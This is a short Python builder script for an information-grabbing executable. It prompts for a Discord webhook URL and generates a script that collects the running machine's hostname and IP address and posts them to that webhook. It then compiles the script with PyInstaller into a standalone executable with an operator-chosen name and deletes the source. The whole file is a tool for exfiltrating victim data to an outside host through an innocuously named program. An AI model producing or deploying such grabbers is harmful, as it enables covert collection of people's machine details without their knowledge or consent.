import socket
import requests
import os

# Get the info
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Get user input for Discord webhook URL
webhook_url = input("Webhook URL: ")

# Write Discord webhook URL to another script
with open("collect_hostname.py", "w") as f:
    f.write(f"""import requests
import socket

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

payload = {{'content': f"Hostname: {{hostname}}" }}
headers = {{'Content-Type': 'application/json'}}
response = requests.post("{webhook_url}", json=payload, headers=headers)

payload = {{'content': f"IP: {{ip_address}}" }}
headers = {{'Content-Type': 'application/json'}}
response = requests.post("{webhook_url}", json=payload, headers=headers)

print(response.text)""")

# Run the newly created script to collect and send the user's hostname
exe_name = input("File Name: ")
os.system("pip install pyinstaller")
os.system(f"pyinstaller --onefile collect_hostname.py --name {exe_name}")
os.remove("collect_hostname.py")




